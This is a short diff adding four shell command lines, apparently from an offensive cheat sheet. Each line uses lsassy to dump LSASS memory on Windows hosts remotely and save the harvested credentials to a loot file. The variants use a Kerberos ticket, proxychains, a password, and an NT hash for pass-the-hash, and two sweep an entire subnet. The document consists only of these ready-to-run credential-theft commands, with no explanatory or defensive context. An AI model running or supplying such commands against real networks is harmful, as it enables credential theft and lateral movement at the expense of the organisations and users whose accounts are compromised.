@@ -1,0 +1,4 @@
+KRB5CCNAME="ticket.ccache" lsassy -k -d "$DOMAIN" -u "$USER" -K lsass_loot -o lsass_creds.txt "$TARGET"
+proxychains lsassy -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -K lsass_loot -o lsass_creds.txt "$TARGET"
+lsassy -v -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
+lsassy -v -u "$USER" -H "$NT_HASH" -K lsass_loot -o lsass_creds.txt 192.168.56.0/24
